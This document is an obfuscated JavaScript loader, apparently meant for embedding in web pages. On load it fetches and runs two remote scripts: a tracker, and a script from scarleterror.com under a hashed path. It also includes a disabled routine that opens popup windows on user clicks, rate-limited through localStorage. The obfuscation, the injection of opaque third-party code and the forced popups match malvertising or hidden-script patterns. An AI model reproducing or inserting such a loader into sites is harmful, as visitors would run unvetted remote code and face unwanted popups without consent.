(() => {
  const _0x55e8b8 = [{
    src: "https://stats.fluxioncloud.com/script.js",
    attributes: {
      "data-website-id": "ff2b2132-6047-4c7b-a829-e17d8bf836b0"
    }
  }, {
    src: "https://scarleterror.com/10/f4/bc/10f4bc504bb30080c17620387ebbf0b5.js",
    attributes: {}
  }];
  const _0x4c5ba2 = false;
  const _0xc8f67 = "";
  const _0x3ff0b3 = 3;
  const _0x397df0 = 600000;
  const _0x433a98 = "scriptLoaderCustomPopV1";
  function _0x49aa96(_0x3f312b, _0x47c5a9 = {}) {
    const _0x324eee = document.createElement("script");
    _0x324eee.src = _0x3f312b;
    for (const [_0x5aa36, _0x5209bf] of Object.entries(_0x47c5a9)) {
      _0x324eee.setAttribute(_0x5aa36, _0x5209bf);
    }
    document.head.appendChild(_0x324eee);
    console.log("", _0x3f312b);
  }
  function _0x21c350() {
    if (!document.head) {
      requestAnimationFrame(_0x21c350);
      return;
    }
    for (const _0x53cd39 of _0x55e8b8) {
      _0x49aa96(_0x53cd39.src, _0x53cd39.attributes);
    }
  }
  function _0x569998() {
    if (!_0x4c5ba2) {
      return;
    }
    function _0x5d2568() {
      try {
        const _0x2d75d2 = JSON.parse(localStorage.getItem(_0x433a98) || "{}");
        if (_0x2d75d2 && typeof _0x2d75d2 === "object") {
          return _0x2d75d2;
        } else {
          return {};
        }
      } catch {
        return {};
      }
    }
    function _0x53db1e(_0x3eb10f) {
      try {
        localStorage.setItem(_0x433a98, JSON.stringify(_0x3eb10f));
      } catch {}
    }
    function _0x4f526e(_0x2e91ba, _0x22e256) {
      const _0x4820e7 = Array.isArray(_0x2e91ba.openedAt) ? _0x2e91ba.openedAt.filter(_0x189da9 => Number.isFinite(_0x189da9) && _0x22e256 - _0x189da9 >= 0 && _0x22e256 - _0x189da9 < _0x397df0) : [];
      let _0x58c48e = Number.isFinite(_0x2e91ba.nextAt) ? _0x2e91ba.nextAt : 0;
      if (!_0x58c48e || _0x58c48e < _0x22e256) {
        _0x58c48e = _0x22e256 + Math.random() * _0x397df0;
      }
      return {
        openedAt: _0x4820e7,
        nextAt: _0x58c48e
      };
    }
    function _0x4e6867() {
      const _0x2a9846 = Date.now();
      const _0x546bd0 = _0x4f526e(_0x5d2568(), _0x2a9846);
      if (_0x2a9846 < _0x546bd0.nextAt) {
        _0x53db1e(_0x546bd0);
        return;
      }
      if (_0x546bd0.openedAt.length >= _0x3ff0b3) {
        _0x53db1e(_0x546bd0);
        return;
      }
      const _0x41775c = window.open(_0xc8f67, "_blank", "noopener");
      if (!_0x41775c) {
        return;
      }
      _0x546bd0.openedAt.push(_0x2a9846);
      _0x546bd0.nextAt = _0x2a9846 + Math.random() * _0x397df0;
      _0x53db1e(_0x546bd0);
    }
    const _0xf3d49 = Date.now();
    const _0x1879bf = _0x4f526e(_0x5d2568(), _0xf3d49);
    _0x53db1e(_0x1879bf);
    document.addEventListener("click", _0x4e6867, {
      passive: true
    });
  }
  _0x21c350();
  _0x569998();
})();
